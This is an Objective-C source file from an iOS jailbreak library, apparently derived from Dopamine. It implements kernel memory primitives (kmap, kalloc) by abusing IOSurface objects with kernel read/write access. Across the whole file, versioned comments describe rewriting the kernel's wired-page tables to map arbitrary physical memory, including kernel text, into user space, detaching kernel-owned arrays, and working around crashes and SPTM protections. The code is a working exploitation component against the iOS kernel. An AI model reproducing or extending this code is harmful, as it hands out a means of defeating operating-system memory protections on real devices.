#import "info.h"
#import "primitives.h"
#import "translation.h"
#import "kernel.h"
#import "util.h"
#import <errno.h>
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreGraphics/CoreGraphics.h>
#import <mach-o/dyld.h>

uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
	uint64_t surfaceClientsArray = kread_ptr(rootUserClient + 0x118);
	return kread_ptr(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

uint64_t IOSurfaceClient_get_surface(uint64_t surfaceClient)
{
	return kread_ptr(surfaceClient + 0x40);
}

uint64_t IOSurfaceSendRight_get_surface(uint64_t surfaceSendRight)
{
	if (gPrimitives.krwMinSafeReadSize > 0x8) {
		uint32_t zoneSize = 0x30;
		uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;

		uint8_t buf[gPrimitives.krwMinSafeReadSize];
		kreadbuf(surfaceSendRight + readOffset, &buf[0], gPrimitives.krwMinSafeReadSize);
		return UNSIGN_PTR(*(uint64_t *)(&buf[0x18 - readOffset]));
	} else {
		return kread_ptr(surfaceSendRight + 0x18);
	}
}

uint64_t IOSurface_get_ranges(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, ranges));
}

void IOSurface_set_ranges(uint64_t surface, uint64_t ranges)
{
	kwrite64(surface + koffsetof(IOSurface, ranges), ranges);
}

uint64_t IOSurface_get_memoryDescriptor(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, memoryDescriptor));
}

uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
{
	return kread_ptr(memoryDescriptor + 0x60);
}

uint64_t IOMemoryDescriptor_set_ranges(uint64_t memoryDescriptor, uint64_t ranges)
{
	return kwrite64(memoryDescriptor + 0x60, ranges);
}

uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
{
	return kread64(memoryDescriptor + 0x50);
}

void IOMemoryDescriptor_set_size(uint64_t memoryDescriptor, uint64_t size)
{
	kwrite64(memoryDescriptor + 0x50, size);
}

void IOMemoryDescriptor_set_wired(uint64_t memoryDescriptor, bool wired)
{
	kwrite8(memoryDescriptor + 0x88, wired);
}

uint32_t IOMemoryDescriptor_get_flags(uint64_t memoryDescriptor)
{
	return kread32(memoryDescriptor + 0x20);
}

void IOMemoryDescriptor_set_flags(uint64_t memoryDescriptor, uint32_t flags)
{
	kwrite8(memoryDescriptor + 0x20, flags);
}

void IOMemoryDescriptor_set_memRef(uint64_t memoryDescriptor, uint64_t memRef)
{
	kwrite64(memoryDescriptor + 0x28, memRef);
}

uint64_t IOSurface_get_rangeCount(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, rangeCount));
}

void IOSurface_set_rangeCount(uint64_t surface, uint32_t rangeCount)
{
	kwrite32(surface + koffsetof(IOSurface, rangeCount), rangeCount);
}

uint64_t IOSurface_port_getSendRight(mach_port_t surfaceMachPort)
{
	uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
	if (koffsetof(IOMachPort, object)) {
		if (gPrimitives.krwMinSafeReadSize > 0x8) {
			uint32_t zoneSize = koffsetof(IOMachPort, object) + 0x8; // object is the last field in IOMachPort
			uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;

			uint8_t buf[gPrimitives.krwMinSafeReadSize];
			kreadbuf(surfaceSendRight + readOffset, &buf[0], gPrimitives.krwMinSafeReadSize);
			surfaceSendRight = UNSIGN_PTR(*(uint64_t *)(&buf[gPrimitives.krwMinSafeReadSize - 0x8]));
		} else {
			surfaceSendRight = kread_ptr(surfaceSendRight + koffsetof(IOMachPort, object));
		}
	}
	return surfaceSendRight;
}

static mach_port_t IOSurface_map_getSurfacePort(uint64_t magic, uint32_t cacheMode)
{
	IOSurfaceRef surfaceRef = NULL;
	if (cacheMode != 0) {
		surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
			(__bridge NSString *)kIOSurfaceWidth : @120,
			(__bridge NSString *)kIOSurfaceHeight : @120,
			(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
			(__bridge NSString *)kIOSurfaceCacheMode : @(cacheMode),
		});
	} else {
		surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
			(__bridge NSString *)kIOSurfaceWidth : @120,
			(__bridge NSString *)kIOSurfaceHeight : @120,
			(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
		});
	}

	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	*((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
	IOSurfaceDecrementUseCount(surfaceRef);
	CFRelease(surfaceRef);
	return port;
}

struct IOSurface_toCleanup {
	uint64_t descriptor;
	uint64_t origRanges;
	uint64_t *fakeRangesUA;
};

// v84: single-active L2 redirect state (kmap PTE-retarget path)
static uint64_t g_l2_addr   = 0;
static uint64_t g_l2_orig   = 0;
static int      g_l2_active = 0;
extern void jb_tr_beacon(const char *fmt, ...);

// v87: census carve-out map (fed by a18_probe after census-done). The
// L2 table PA is checked against these BEFORE any primitive access —
// v86 panicked because the pool's L2 table page sat in a hole on that
// boot (kernel TTBR1 has no alias for hole pages).
static struct { uint64_t lo, hi; } g_holes[16];
static int g_hole_n = 0;
void IOSurface_set_hole_run(uint64_t basePA, uint64_t pages)
{
	if (g_hole_n < 16) {
		g_holes[g_hole_n].lo = basePA;
		g_holes[g_hole_n].hi = basePA + pages * 0x4000ULL;
		g_hole_n++;
	}
}
static int pa_in_hole(uint64_t pa)
{
	for (int i = 0; i < g_hole_n; i++)
		if (pa >= g_holes[i].lo && pa < g_holes[i].hi) return 1;
	return 0;
}

uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak); // fwd: defined below
static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size); // v94 fwd: defined below
static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int mode); // v97 fwd

struct IOSurface_toCleanup *cleanups = NULL;
unsigned cleanupsCount = 0;

// v84: restore hook — runs at kmap() ENTRY (before any new redirect) and
// on kernel-panic path teardown (fwscan flush/reboot), making the redirect
// self-healing: the L2 entry survives only while the exploit wants it.
void IOSurface_l2_restore(void)
{
	if (g_l2_active) {
		kwrite64(g_l2_addr, g_l2_orig);
		jb_tr_beacon("KMAP l2,restored,addr=%llx", (unsigned long long)g_l2_addr);
		g_l2_active = 0;
	}
}

int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32_t cacheMode)
{
	// v73: step-by-step beacons — kmap-fail at fwscan time was instant and
	// uniform across all 8 census windows; this names the failing step.
	// No control-flow changes: only observations (plus a NULL-port guard
	// that only matters in the already-failing case).
	jb_tr_beacon("KMAP step0,pa=%llx,size=%llx,cm=%u",
	             (unsigned long long)pa, (unsigned long long)size, cacheMode);
	// v81: PTE RETARGET. v78/v80 proved GetBaseAddress is a pure cached-
	// mapping getter on 18.2 — no IOSurface field rewrite changes what it
	// maps (C,first=0x539,0 = own surface ID in all 20 windows). So: take
	// the surface's own valid 64KB mapping and rewrite its L3 PTEs to the
	// target PA. No descriptor/surface writes at all — teardown-safe.
	static unsigned g_kmap_seq = 0;
	unsigned seq = g_kmap_seq++;
	jb_tr_beacon("KMAP win=%u", seq);
	// v94 FRESH-SURFACE COLD-MAP (§64: base1==base0 in 16/16 windows on
	// the WARM port-1337 client despite VERIFIED descriptor retargets ⇒
	// the cached mapping lives in the per-task IOSurfaceClient). Bypass:
	// a NEW surface per window — its client is COLD, so the FIRST
	// GetBaseAddress must build the mapping from the surface's own
	// (weaponized) range list. Every write = ordinary data-page heap via
	// alias/primitive (the only SPTM-surviving store class, proven ×5).
	// Zero PT writes. One hypothesis per launch (v94b fallback: client
	// walk via the sr0/sr8/sr30 dump).
	(void)cacheMode;
	// v98: create 64KB-backed legacy surfaces (4 backing pages = 4 slots
	// in the kernel's packed page list, one per probe-scan page).
	mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(0x10000);
	if (!surfaceMachPort) {
		jb_tr_beacon("KMAP fail,noport");
		*uaddr = NULL;
		return -1;
	}
	uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
	uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
	uint64_t desc = IOSurface_get_memoryDescriptor(surface);
	uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
	jb_tr_beacon("KMAP fresh,sr=%llx,surface=%llx,desc=%llx,ranges=%llx",
	             (unsigned long long)surfaceSendRight,
	             (unsigned long long)surface,
	             (unsigned long long)desc, (unsigned long long)ranges);
	if (!desc || !ranges) {
		jb_tr_beacon("KMAP fail,freshfields");
		*uaddr = NULL;
		return -1;
	}

	// v93→v98 ARC NOTE (history): v93 desc retargets land but warm client
	// serves cache (§64); v94 fresh surface + cold client maps REAL pages
	// but from the CREATE-time list (C,first=0,0, §66); v95/96 flag ladders
	// all-0,0 incl. control (§67/§68) — type encoding irrelevant; v97:
	// ctor mode ladder — ranges-only create REJECTED (AllocSize mandatory),
	// A5 control mapped (C,first=A5A5…) ⇒ the wire resolves USER-VAs from
	// the create list and maps the backing; packed page list = its OUTPUT
	// (§55's VM_PAGE_PACKED discovery). v98 = rewrite THE PACKED LIST.
	// The list lives in the surface's OWN 16KB ranges array (v89/v93-proven
	// alias-write class). Encoding learned ON DEVICE:
	//   wire → base1 aliases backing page 0 → its PA = vtophys(base1)
	//   sample = list[0] as stored ⇒ f(PA) known for a real sample ⇒
	//   packed(page) = sample | (page - sample0) bit-accurate for
	//   same-format addresses (the packed base field carries [47:12]; we
	//   replicate the observed low garbage and substitute OUR pages' bits
	//   above the observed page size).
	{
		// FIRST: map the untouched surface (wire #1) to learn the packing.
		IOSurfaceRef ref0 = IOSurfaceLookupFromMachPort(surfaceMachPort);
		if (!ref0) {
			jb_tr_beacon("KMAP fail,lookup0");
			*uaddr = NULL;
			return -1;
		}
		void *base0v = IOSurfaceGetBaseAddress(ref0);
		if (!base0v) {
			jb_tr_beacon("KMAP fail,base0v");
			*uaddr = NULL;
			return -1;
		}
		uint64_t backingPA = kvtophys((uint64_t)base0v);
		jb_tr_beacon("KMAP wire1,base=%llx,pa=%llx",
		             (unsigned long long)(uintptr_t)base0v,
		             (unsigned long long)backingPA);

		// Read the surface's packed page list (first 4 slots) via the
		// array alias — v89/v93-proven window class (16KB data page).
		uint64_t arrAlias = phystokv(kvtophys(ranges));
		if (!arrAlias) {
			jb_tr_beacon("KMAP fail,arralias");
			*uaddr = NULL;
			return -1;
		}
		uint64_t arrOff = ranges & 0x3FFFULL;
		if (arrOff + 4 * 8 > 0x4000) {
			jb_tr_beacon("KMAP fail,slotrange,arrOff=%llx", (unsigned long long)arrOff);
			*uaddr = NULL;
			return -1;
		}
		uint64_t s0 = kread64(arrAlias + arrOff + 0);
		uint64_t s1 = kread64(arrAlias + arrOff + 8);
		uint64_t s2 = kread64(arrAlias + arrOff + 16);
		jb_tr_beacon("KMAP packed,s0=%llx,s1=%llx,s2=%llx",
		             (unsigned long long)s0, (unsigned long long)s1,
		             (unsigned long long)s2);

		// v99 (v98 verdict): desc+0x60's array is the ECHOED CREATE INPUT
		// (s0==s2=dummyPageVA, s1=dummyPageSize — user-VA {addr,size}
		// pairs), NOT the wire's packed output.
		// v100 = DEEP DUMP of the two live candidates (v99 located them):
		//   d70 — SHARED across all windows, q0=0xb022000000 (packed
		//         page-number family, shift-8), q2=0x10100000014 (packed
		//         pair + flags) — global packed-page arena/array suspect.
		//   d90 — PER-SURFACE (q2 moved e38aabc000→d3c000 with each fresh
		//         surface) — the surface's own wired-page table suspect.
		// 16 qwords each through the alias (proven read class), and for
		// d90 also walk q2 (its moving pointer) one level deeper.
		uint64_t d70 = kread64(desc + 0x70);
		uint64_t d90 = kread64(desc + 0x90);
		jb_tr_beacon("KMAP cand,d70=%llx,d90=%llx",
		             (unsigned long long)d70, (unsigned long long)d90);
		uint64_t a70 = d70 ? phystokv(kvtophys(d70)) : 0;
		uint64_t a90 = d90 ? phystokv(kvtophys(d90)) : 0;
		jb_tr_beacon("KMAP cand,al70=%llx,al90=%llx",
		             (unsigned long long)a70, (unsigned long long)a90);
		if (a70) {
			int n70 = (seq == 0) ? 16 : 3;   // window 0: full dump; rest: spot
			for (int qi = 0; qi < n70; qi++)
				jb_tr_beacon("KMAP d70,q%d=%llx", qi,
				             (unsigned long long)kread64(a70 + 8 * qi));
		}
		if (a90) {
			// v101: the WIRED-PAGE TABLE is d90.q2 (v100: records of
			// (PAC,1,tablePtr,0x30), table entries = (pagenum<<12)|flags,
			// header q5=0xc040_00001000, live entries from q6).
			// REWRITE, timed AFTER drain-to-0 / BEFORE increment (an
			// unwire may rebuild the table from the descriptor — the
			// rewrite must be the last thing the re-wire sees).
			uint64_t q2 = kread64(a90 + 16);
			uint64_t aq2 = q2 ? phystokv(kvtophys(q2)) : 0;
			jb_tr_beacon("KMAP d90,q2=%llx,al=%llx",
			             (unsigned long long)q2, (unsigned long long)aq2);
			if (aq2 && seq == 0) {
				for (int qi = 0; qi < 16; qi++)
					jb_tr_beacon("KMAP d90q2,q%d=%llx", qi,
					             (unsigned long long)kread64(aq2 + 8 * qi));
			}
			if (!aq2) {
				jb_tr_beacon("KMAP fail,noq2alias");
				*uaddr = NULL;
				return -1;
			}
			// v103: HEADER VALIDATION before any table access (panic
			// 14:58:16 decode: a post-drain alias read landed in a
			// kalloc.48 element — the previous table page was freed on its
			// surface's unwire and partially reused; our walk crossed into
			// it). v100 ground truth: live tables carry q5 = 0xc040_00001000
			// (flags 0xc040 high, length 0x1000 low). Mismatch = stale/freed
			// page → abort the window, no reads, no writes.
			{
				uint64_t hdr = kread64(aq2 + 8 * 5);
				jb_tr_beacon("KMAP q2hdr=%llx", (unsigned long long)hdr);
				if ((hdr >> 32) != 0xc040ULL || (hdr & 0xFFFFFFFFULL) != 0x1000ULL) {
					jb_tr_beacon("KMAP fail,q2,stale,hdr=%llx",
					             (unsigned long long)hdr);
					*uaddr = NULL;
					return -1;
				}
			}

			// Drain to 0 FIRST (unwire — the re-wire will rebuild, and our
			// rewrite lands after the drain so it survives as the input).
			uint32_t uc = IOSurfaceGetUseCount(ref0);
			while (uc > 0) {
				IOSurfaceDecrementUseCount(ref0);
				uc = IOSurfaceGetUseCount(ref0);
			}

			// Snapshot the table POST-DRAIN (it may have been rebuilt),
			// then rewrite every non-zero entry's pagenum to the window
			// BASE page, preserving each entry's own flags. (v100 showed
			// q6==q7 — slot↔page correspondence unproven; v101 maps ALL
			// entries to the base page = single-page verification. The
			// probe's first read still discriminates: hole content vs 0,0.)
			uint64_t snap[16];
			int nEntries = 0, nRewritten = 0;
			// v102 FIX (v101 verdict): the table's pagenum unit is 0x4000 —
			// PA = pagenum * 0x4000 (v100's own sample: 0x404075 →
			// 0x10101d4000). v101 wrote pa>>12 = 4x the correct pagenum,
			// aiming the backing at PA/4 (unmapped) → C,first=0,0 was the
			// bug, not a rebuild fight. pagenum = pa >> 14.
			// v103 CONTROL LADDER (v102 verdict: shift fix correct —
			// entries decoded to the exact carve-out PA — but 9 windows
			// of C,first=0,0. Ambiguous: hole-reads-zero vs rewrite
			// ignored. Discriminate with a KNOWN-CONTENT control: seq%3
			//   0: carve-out PA (the hunt)
			//   1: kernel text page (kbase from DONE beacon — C,first must
			//      show Mach-O magic 0xfeedfacf if the rewrite path works)
			//   2: carve-out PA (hunt)
			// kbase is beaconed by ClearSword before Titan runs; stash it
			// from the krw layer.
			uint64_t pagenum;
			// v104 CONTROL FIX (v103 verdict: the control used kbase's
			// VIRTUAL pagenum — kconstant(base) is the virtual kernel base;
			// the wire maps PHYSICAL pages, so the control pointed at an
			// invalid PA and 0,0 was EXPECTED on controls too — the rewrite
			// path is NOT disproven). Correct control pagenum =
			// physmap alias of the text page:
			//   PA_text = kbase - virtBase + physBase
			//   pagenum = PA_text >> 14
			// (same translation the probe itself uses for its windows.)
			{
				uint64_t pagenumCtl;
				uint64_t paText = kconstant(base) - kconstant(virtBase)
				                + kconstant(physBase);
				pagenumCtl = paText >> 14;
				if ((seq % 3) == 1 && kconstant(base)
				                 && kconstant(base) != kconstant(staticBase))
					pagenum = pagenumCtl;
				else
					pagenum = (pa & ~0x3FFFULL) >> 14;
			}
			for (int qi = 6; qi < 16; qi++) {
				snap[qi] = kread64(aq2 + 8 * qi);
				if (seq == 0)
					jb_tr_beacon("KMAP wt,pre,q%d=%llx", qi,
					             (unsigned long long)snap[qi]);
				if (snap[qi] == 0) continue;
				nEntries++;
				uint64_t newEnt = (snap[qi] & 0xFFFULL) | (pagenum << 12);
				kwrite64(aq2 + 8 * qi, newEnt);
				nRewritten++;
				if (seq == 0)
					jb_tr_beacon("KMAP wt,rew,q%d: %llx->%llx", qi,
					             (unsigned long long)snap[qi],
					             (unsigned long long)newEnt);
			}
			jb_tr_beacon("KMAP wt,done,entries=%d,rewritten=%d",
			             nEntries, nRewritten);
			if (nRewritten == 0) {
				jb_tr_beacon("KMAP fail,wt,noentries");
				*uaddr = NULL;
				return -1;
			}

			// Re-wire: the increment reads our rewritten table.
			IOSurfaceIncrementUseCount(ref0);
			jb_tr_beacon("KMAP uc,cycled=1");
		} else {
			jb_tr_beacon("KMAP fail,nod90");
			*uaddr = NULL;
			return -1;
		}
	}

	// Send-right kobject field dump (client-walk fallback feed).
	jb_tr_beacon("KMAP sr0=%llx,sr8=%llx,sr30=%llx",
	             (unsigned long long)kread64(surfaceSendRight + 0x0),
	             (unsigned long long)kread64(surfaceSendRight + 0x8),
	             (unsigned long long)kread64(surfaceSendRight + 0x30));

	// THE KERNEL DOES THE MAPPING: post-cycle lookup + GetBaseAddress.
	// v97 discriminator:
	//  mode 2 (A5): C,first = 0xA5A5A5A5A5A5A5A5 ⇒ THE WIRE READS THE
	//               LIST (any time) — v98 ladders PA encodings with the
	//               live list. 0,0 ⇒ wire never reads it post-create.
	//  mode 1 (ranges-only): base1!=0 + target/A5 content ⇒ ranges-only
	//               surfaces wire from the live list ⇒ v98 = create
	//               weaponized lists only. base1=0/fail ⇒ ranges-only
	//               surfaces unsupported ⇒ wire is alloc-size-only.
	//  mode 0 (legacy): expected 0,0 (control, matches v94/95/96).
	IOSurfaceRef refB = IOSurfaceLookupFromMachPort(surfaceMachPort);
	int lookupB = (refB != NULL);
	void *base1 = lookupB ? IOSurfaceGetBaseAddress(refB) : NULL;
	jb_tr_beacon("KMAP B,lookup=%d,base1=%llx",
	             lookupB,
	             (unsigned long long)(uintptr_t)base1);
	if (!lookupB || !base1) {
		jb_tr_beacon("KMAP fail,base1");
		*uaddr = NULL;
		return -1;
	}
	// v101 discriminator: TARGET WINDOW CONTENT (carve-out bytes) ⇒ the
	// wired-table rewrite re-aimed the backing ⇒ base1 IS the probe window
	// ⇒ CHAIN GATE. 0,0 ⇒ the re-wire rebuilds the table from the desc
	// AFTER our rewrite (ordering fight) ⇒ v102 rewrites the DESC-side
	// source instead. Unmapped-fault pattern ⇒ entry format mismatch.
	jb_tr_beacon("KMAP C,first=%llx,%llx",
	             (unsigned long long)*(volatile uint64_t *)base1,
	             (unsigned long long)((volatile uint64_t *)base1)[1]);
	*uaddr = base1;
	return 0;
}

int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr) {
	return IOSurface_map_withCacheMode(pa, size, uaddr, 0);
}

void IOSurface_map_cleanup(void)
{
	IOSurface_l2_restore(); // v84: never leave the L2 redirect dangling

	if (cleanupsCount == 0) return;

	for (unsigned i = 0; i < cleanupsCount; i++) {
		uint64_t desc = cleanups[i].descriptor;
		uint64_t origRanges = cleanups[i].origRanges;
		uint64_t *fakeRangesUA = cleanups[i].fakeRangesUA;

		IOMemoryDescriptor_set_ranges(desc, origRanges);
		free(fakeRangesUA);
	}

	free(cleanups);
	cleanups = NULL;
	cleanupsCount = 0;
}

static CFNumberRef CFNUM64(uint64_t value) {
    return CFNumberCreate(NULL, kCFNumberSInt64Type, (void *)&value);
}

static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
	// v98: create with a 64KB backing so the packed page list has 4 slots
	// to retarget (one per probe-scan page); the wire maps ALL of them.
	if (size <= 0x4000) size = 0x10000;
	return IOSurface_kalloc_getSurfacePort_16up_mode(size, 0);
}

// v97: mode ladder — the wire's source-of-truth experiment.
//   mode 0: legacy (AllocSize + dummy ranges) — v94/95/96 behavior.
//   mode 1: RANGES-ONLY (no AllocSize key) — no kernel fallback backing;
//           forces the wire to consume the range list. Caller weapons the
//           live array before first GetBaseAddress.
//   mode 2: A5 CONTROL (legacy keys) + a second A5-filled user page as
//           entry target — if the wire reads the list AT ALL (any time),
//           C,first = 0xA5A5A5A5A5A5A5A5. Unambiguous positive control.
static mach_port_t IOSurface_kalloc_getSurfacePort_16up_mode(uint64_t size, int mode) {
	uint64_t rangesAlignedSize = ((size + 0xf) & ~0xf);

	static vm_size_t dummyPageSize = 0x4000;
	static vm_address_t dummyPage = 0;
	if (dummyPage == 0) {
		vm_allocate(mach_task_self(), &dummyPage, dummyPageSize, VM_FLAGS_ANYWHERE);
	}
	static vm_address_t a5Page = 0;
	if (mode == 2 && a5Page == 0) {
		vm_allocate(mach_task_self(), &a5Page, dummyPageSize, VM_FLAGS_ANYWHERE);
		if (a5Page) memset((void *)a5Page, 0xA5, dummyPageSize);
	}

	uint64_t *userspaceRanges = malloc(rangesAlignedSize);
	uint64_t entryTarget = (mode == 2 && a5Page) ? a5Page : dummyPage;
	for (int i = 0; i < (rangesAlignedSize / sizeof(uint64_t)); i += 2) {
		userspaceRanges[i] = entryTarget;
		userspaceRanges[i+1] = dummyPageSize;
	}

    CFDataRef userspaceRangesData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)userspaceRanges, rangesAlignedSize);
    free(userspaceRanges);

    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
	if (mode != 1) {
		// legacy + A5-control: AllocSize present (kernel-owned backing).
		CFNumberRef sizeNum = CFNUM64(dummyPageSize);
		CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), (const void *)sizeNum);
		CFRelease(sizeNum);
	} // mode 1: NO AllocSize key — ranges-only surface.
	CFDictionarySetValue(dict, CFSTR("IOSurfaceAddressRanges"), (const void *)userspaceRangesData);

    IOSurfaceRef surfaceRef = IOSurfaceCreate(dict);
    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
    IOSurfaceDecrementUseCount(surfaceRef);

	CFRelease(userspaceRangesData);
	CFRelease(dict);
	jb_tr_beacon("KMAP ctor,mode=%d,port=%x", mode, port);

    return port;
}

uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak)
{
	if (size > 0x10000) return -1; // 0x10000 is max

	// v89 RMW-law fix, second pass (v88 run 13:32:35): runtime offsets are
	// ranges=0x360, rangeCount=0x3a4 (§49/§50 ground truth) — 0x44 apart, so
	// ONE 32B window can never cover both (v88's fail,offsets guard proved
	// it live, 32 beacons, no panic). Two windows, each fully inside the
	// 960B object (end 0x3c0):
	//   W_R [0x360,0x380)  ranges @ win+0
	//   W_C [0x388,0x3a8)  rangeCount @ win+0x1c (field end == window end)
	// Field reads extract from the window buffer; leak=true detaches the
	// array (original Dopamine semantics: kernel forgets it without freeing
	// → nothing can ever rewrite our fake L3) via RMW-style window writes
	// that preserve neighbors BY CONTENT.
	uint32_t offRanges   = koffsetof(IOSurface, ranges);
	uint32_t offRangeCnt = koffsetof(IOSurface, rangeCount);
	if (offRanges > 960 - 0x20 || (offRanges % 8) != 0) {
		jb_tr_beacon("KALLOC16UP fail,winR,ranges=%x", offRanges);
		return 0;
	}
	if (offRangeCnt < offRanges + 0x20 || offRangeCnt > 960 - 0x4) {
		jb_tr_beacon("KALLOC16UP fail,winC,cnt=%x", offRangeCnt);
		return 0;
	}
	uint32_t offWinC     = offRangeCnt - 0x1c;           // 0x3a4-0x1c = 0x388
	uint32_t cntOffInWin = offRangeCnt - offWinC;        // 0x1c
	if ((offRangeCnt + 0x4) > (offWinC + 0x20)) {        // field inside W_C
		jb_tr_beacon("KALLOC16UP fail,winCspan,cnt=%x", offRangeCnt);
		return 0;
	}

	while (true) {
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(size);

		uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);

		// W_R: ranges qword (window [0x360,0x380) — v80-proven safe).
		uint8_t winR[0x20];
		if (kreadbuf(surface + offRanges, winR, sizeof(winR)) != 0) {
			jb_tr_beacon("KALLOC16UP fail,readR,surface=%llx", (unsigned long long)surface);
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}
		uint64_t va = UNSIGN_PTR(*(uint64_t *)(winR + 0));

		// W_C: rangeCount dword (window [0x388,0x3a8) ⊆ object).
		uint8_t winC[0x20];
		if (kreadbuf(surface + offWinC, winC, sizeof(winC)) != 0) {
			jb_tr_beacon("KALLOC16UP fail,readC,surface=%llx", (unsigned long long)surface);
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}
		uint64_t vaSize = (uint64_t)(*(uint32_t *)(winC + cntOffInWin)) * 0x10;

		if (vaSize < size) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (leak) {
			// Detach: ranges=0 via W_R RMW (preserve 0x368..0x380),
			// rangeCount=0 via W_C RMW (preserve 0x388..0x3a4).
			*(uint64_t *)(winR + 0) = 0;
			if (kwritebuf(surface + offRanges, winR, sizeof(winR)) != 0) {
				jb_tr_beacon("KALLOC16UP fail,writeR,surface=%llx", (unsigned long long)surface);
				mach_port_deallocate(mach_task_self(), surfaceMachPort);
				continue;
			}
			*(uint32_t *)(winC + cntOffInWin) = 0;
			if (kwritebuf(surface + offWinC, winC, sizeof(winC)) != 0) {
				jb_tr_beacon("KALLOC16UP fail,writeC,surface=%llx", (unsigned long long)surface);
				mach_port_deallocate(mach_task_self(), surfaceMachPort);
				continue;
			}
		}
		// leak=false: array stays attached — freed with the surface; caller
		// must finish before teardown (original semantics, unchanged).
		// Success path intentionally never deallocates the port send right
		// (original Dopamine behavior — the surface outlives the call).

		jb_tr_beacon("KALLOC16UP ok,va=%llx,size=%llx,leak=%d",
		             (unsigned long long)va, (unsigned long long)vaSize, leak ? 1 : 0);
		return va;
	}

	return 0;
}

static mach_port_t IOSurface_kalloc_getSurfacePort_15(uint64_t size)
{
	uint64_t allocSize = 0x10;
	uint64_t *addressRangesBuf = (uint64_t *)malloc(size);
	memset(addressRangesBuf, 0, size);
	addressRangesBuf[0] = (uint64_t)malloc(allocSize);
	addressRangesBuf[1] = allocSize;
	NSData *addressRanges = [NSData dataWithBytes:addressRangesBuf length:size];
	free(addressRangesBuf);

	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		@"IOSurfaceAllocSize" : @(allocSize),
		@"IOSurfaceAddressRanges" : addressRanges,
	});
	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	IOSurfaceDecrementUseCount(surfaceRef);
	return port;
}

uint64_t IOSurface_kalloc_15(uint64_t size, bool leak)
{
	while (true) {
		uint64_t allocSize = max(size, 0x10000);
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_15(allocSize);

		uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
		uint64_t va = IOSurface_get_ranges(surface);

		if (kvtophys(va + allocSize) != 0) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (va == 0) continue;

		if (leak) {
			IOSurface_set_ranges(surface, 0);
			IOSurface_set_rangeCount(surface, 0);
		}

		return va + (allocSize - size);
	}

	return 0;
}

int IOSurface_kalloc_global(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = 0;
	if (@available(iOS 16.0, *)) {
		alloc = IOSurface_kalloc_16up(size, true);
	}
	else {
		alloc = IOSurface_kalloc_15(size, true);
	}

	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

int IOSurface_kalloc_local(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = 0;
	if (@available(iOS 16.0, *)) {
		alloc = IOSurface_kalloc_16up(size, false);
	}
	else {
		alloc = IOSurface_kalloc_15(size, false);
	}
	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

void libjailbreak_IOSurface_primitives_init(void)
{
	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		(__bridge NSString *)kIOSurfaceWidth : @120,
		(__bridge NSString *)kIOSurfaceHeight : @120,
		(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
	});
	if (!surfaceRef) {
		char execPath[PATH_MAX];
		uint32_t execPathSize = PATH_MAX;
		_NSGetExecutablePath(execPath, &execPathSize);
		printf("Failed to initialize IOSurface primitives, add \"IOSurfaceRootUserClient\" to the \"com.apple.security.exception.iokit-user-client-class\" dictionary of the entitlements from \"%s\" to fix this. Due to this, the kalloc, kmap and kcall primitives will not work.\n", execPath);
		return;
	}
	CFRelease(surfaceRef);

	gPrimitives.kmap = IOSurface_map;
	gPrimitives.kalloc_global = IOSurface_kalloc_global;
	gPrimitives.kalloc_local  = IOSurface_kalloc_local;
}